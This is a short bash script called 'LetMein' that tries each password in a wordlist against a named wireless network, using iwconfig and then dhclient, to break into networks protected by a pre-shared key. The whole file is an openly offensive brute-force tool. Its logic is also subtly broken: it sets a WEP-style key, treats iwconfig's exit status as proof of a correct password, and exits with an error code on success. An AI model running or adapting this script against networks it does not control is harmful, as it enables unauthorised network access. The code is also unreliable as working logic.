#!/bin/bash
########################################
# Name: LetMein
# Version: 0.0.1
# Author: @2bitwannabe
# Desc: Wireless Script to use a wordlist to attempt to establish a
# connect to a designated wireless network (using a PSK).
# Notes: This is  a super Hacky McHackHack version 
# Dependencies: Kali Linux
# Usage:
# ./letmein.sh HackMeWirelessNetwork wordlist.txt wlan0
#
#########################################
IFS=$'\n'      
set -f         
for i in $(cat "$2"); do
  echo -e "Trying ssid=$1 using psk=$i"  
  iwconfig $3 essid $1 key $i

  if [ $? -eq 0 ]
  then
      echo -e  "\\r\\nWinning! - Attempting to get IP Address"
        dhclient $3
      exit 1
  else
      echo -e "\\r\\nIncorrect, moving on"
  fi
done
